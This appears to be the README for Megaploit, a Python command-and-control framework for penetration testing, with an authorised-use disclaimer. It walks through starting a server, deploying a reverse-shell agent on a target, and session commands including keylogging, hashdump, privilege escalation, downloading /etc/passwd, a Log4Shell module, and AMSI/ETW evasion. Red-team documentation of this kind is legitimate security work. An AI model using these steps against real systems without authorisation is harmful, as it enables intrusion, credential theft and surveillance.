# Megaploit Documentation

**Professional C2 Framework & Security Research Toolbox · v4.1.0**

> ⚠️ **For authorised security research and penetration testing only.**
> You must have explicit written permission before using this tool against any system.
> Misuse is illegal and unethical. The authors accept no liability.

---

## What is Megaploit?

Megaploit is a **Python-native Command & Control (C2) framework** and **penetration testing toolbox**.
It gives you a Metasploit-style interactive console to manage reverse-shell agents, run exploit modules, build payloads, and harvest data — all from one tool.

**Who is this for?**

| User | What you get |
|---|---|
| **Beginner pentester** | Step-by-step guides, full examples for every command, no assumed knowledge |
| **Red team operator** | 135 session commands, AES-256-GCM encrypted C2, AMSI/ETW bypass, malleable profiles |
| **Developer / researcher** | Metasploit-style module API in pure Python — write a module in ~20 lines |

---

## First Time? Start Here

### 1. Install

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
pip install cryptography    # strongly recommended — enables AES-256-GCM
```

### 2. Generate a Secret Key

Both the server and the agent use this key to authenticate each other:

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

### 3. Start the Server

Replace `192.168.1.10` with your real IP address (the IP the target machine can reach):

```bash
python3 server.py -lh 192.168.1.10 -p 4444
```

With TLS (recommended):

```bash
python3 server.py -lh 192.168.1.10 -p 4444 --tls
```

### 4. Generate an Agent

Inside the console:

```
megaploit [0] » set lhost 192.168.1.10
megaploit [0] » set port 4444
megaploit [0] » generate
```

### 5. Deploy the Agent

Copy `agent.py`, `secret.key`, and the `megaploit/` folder to the target machine, then run:

```bash
# On the target:
python3 agent.py
```

### 6. Get a Shell

When the agent connects, a notification appears:

```
  ★  NEW SESSION  #1  ★
  Address   10.0.0.42:49321
  Interact  use 1
```

Type `use 1` to interact:

```
megaploit [1] » use 1

megaploit (10.0.0.42) > whoami
megaploit (10.0.0.42) > sysinfo
megaploit (10.0.0.42) > ls
megaploit (10.0.0.42) > download /etc/passwd
megaploit (10.0.0.42) > background
```

---

## Documentation Index

| Guide | Who should read it | What you'll learn |
|---|---|---|
| **[Quick-Start Guide](QUICKSTART.md)** | Beginners | 0-to-shell in under 10 minutes — install, generate, deliver, interact |
| **[CLI Reference](CLI_REFERENCE.md)** | Everyone | Every single command with examples — global, session, module contexts |
| **[Cheat Sheet](CHEATSHEET.md)** | Everyone | One-page printable reference for all major commands |
| **[Payload Builder](PAYLOAD_BUILDER.md)** | Everyone | How to build EXE, PS1, Go binary, and 11 other payload formats |
| **[Module System](MODULE_SYSTEM.md)** | Everyone + developers | Using exploit/scanner modules; writing your own |
| **[Post-Exploitation Pipeline](PIPELINE.md)** | Intermediate | Auto-harvest creds and recon on every new session |
| **[Networking & Pivoting](NETWORKING.md)** | Intermediate | SOCKS5, portfwd, pivot routes, WebSocket transport |
| **[Troubleshooting](TROUBLESHOOTING.md)** | Everyone | Solutions to the most common installation and runtime problems |
| **[Malleable C2 Profile](C2_PROFILE.md)** | Advanced | Shape traffic to look like legitimate software |
| **[Web Dashboard](WEB_DASHBOARD.md)** | Advanced | Flask live dashboard + REST API |
| **[Architecture](ARCHITECTURE.md)** | Developers | Code structure, transport protocol, session lifecycle |

---

## Key Concepts

### Two Prompts

Megaploit has two separate prompts:

```
v4  megaploit [1] »        ← GLOBAL prompt (between sessions)
v4  megaploit session(1) » ← SESSION prompt (inside use 1)
```

- At the **global prompt**: manage sessions, modules, payloads, reports
- At the **session prompt**: interact directly with the compromised machine

### Sessions

Every agent that connects becomes a numbered session:

```
megaploit [0] » sessions          # list sessions
megaploit [0] » use 1             # enter session 1
megaploit [0] » sessions -K       # kill all sessions
megaploit [0] » sessions -c whoami  # run on ALL sessions
```

### Modules

Modules are like Metasploit modules — select, configure, run:

```
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » check
megaploit [0] » run
```

### Tab Completion

Press `Tab` at any prompt to see available commands, module names, and tool names. Arrow keys navigate history.

---

## Quick Reference Card

### Most-Used Session Commands

```bash
sysinfo              # full system info
whoami               # current user + privilege level
ps                   # process list
ls [path]            # directory listing
cat <file>           # read file
download <file>      # pull file to your machine
upload <file>        # push file to target
screenshot           # take a screenshot
keylog_start         # start keylogger
hashdump             # dump password hashes
getsystem            # escalate to SYSTEM/root
background           # go back to global prompt
```

### Most-Used Global Commands

```bash
sessions             # list active sessions
use <id>             # enter a session
payload ps1 --out a.ps1   # build a PowerShell payload
show modules         # browse exploit/scanner modules
report html out.html # generate engagement report
creds show           # show harvested credentials
```

---

## Getting Help Inside the Console

```bash
help                 # show all commands with descriptions
help <command>       # show help for one command (if supported)
whats new            # show what changed in v4.1
history              # show your last 20 commands
```

---

*Made with ❤️ for the security research community.*
